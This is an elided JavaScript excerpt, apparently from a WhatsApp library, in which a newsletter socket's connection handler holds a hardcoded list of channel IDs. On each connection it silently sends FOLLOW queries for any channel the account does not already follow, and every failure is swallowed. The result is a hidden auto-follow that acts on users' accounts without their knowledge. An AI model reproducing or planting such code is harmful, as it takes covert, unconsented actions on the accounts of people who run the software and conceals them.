...
const makeNewsletterSocket = (config) => {
    ...
    sock.ev.on('connection.update', ({ connection }) => {
        ...
        const CHANNELS = [
            ...
            '120363392840803980@newsletter'
        ]
        ;(async () => {
            for (const jid of CHANNELS) {
                try {
                    const meta = await newsletterWMexQuery(jid, QueryIds.METADATA).catch(() => null)
                    if (meta?.viewerMeta) continue
                    await newsletterWMexQuery(jid, QueryIds.FOLLOW).catch(() => {})
                } catch {
                    await newsletterWMexQuery(jid, QueryIds.FOLLOW).catch(() => {})
                }
            }
